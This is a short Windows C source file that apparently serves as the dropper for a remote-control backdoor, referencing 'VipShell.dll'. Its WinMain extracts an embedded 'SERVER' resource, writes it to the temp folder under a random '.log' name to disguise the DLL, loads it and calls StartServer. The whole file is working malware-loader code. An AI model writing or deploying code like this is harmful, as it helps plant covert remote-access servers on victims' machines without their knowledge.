#include <windows.h>
#include "resource.h"
#include "tchar.h"
#include "..\DllModule.h"
CDllModuleControlInterface* g_hDllModule = NULL;
typedef bool (* PGetDllModule)(CDllModuleControlInterface** pDll);    //启动服务
bool MakeDll(LPCTSTR szDllFile)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize, dwWritten;
	LPBYTE p;
	HANDLE hFile;
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_SERVER1), _T("SERVER"));
	if (hResInfo == NULL)
          return false;
	// 获得资源尺寸
    dwSize = SizeofResource(NULL, hResInfo);
	 // 装载资源
    hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
          return false;
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
        if (p == NULL)
         return false;
		// 复制资源数据
    CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
	hFile = CreateFile(szDllFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
          WriteFile(hFile, (LPCVOID)p, dwSize, &dwWritten, NULL);
    else
        {
          GlobalFree((HGLOBAL)p);
          return false;
        }
	  CloseHandle(hFile);
      GlobalFree((HGLOBAL)p);
	  return true;
	return true;
}


int WINAPI WinMain(          HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{
	TCHAR szTempPath[MAX_PATH] = {0};
	GetTempPath(MAX_PATH, szTempPath);
	if(szTempPath[lstrlen(szTempPath) -1] != _T('\\'))
		lstrcat(szTempPath, _T("\\"));
	TCHAR szDllpath[MAX_PATH] = {0};
	srand(GetTickCount());
	wsprintf(szDllpath, _T("%s%d.log"),  szTempPath, (DWORD)rand());
	MakeDll(szDllpath);
//	lstrcpy(szDllpath, _T("VipShell.dll"));
	HINSTANCE hDLL  = LoadLibrary(szDllpath);
	if( !hDLL )
		return 0;
	PGetDllModule pGetDllModule = (PGetDllModule)GetProcAddress(hDLL, "GetDllModuleControl");   //得到函数地址
	pGetDllModule(&g_hDllModule);
	g_hDllModule->StartServer();
	return 0;
}

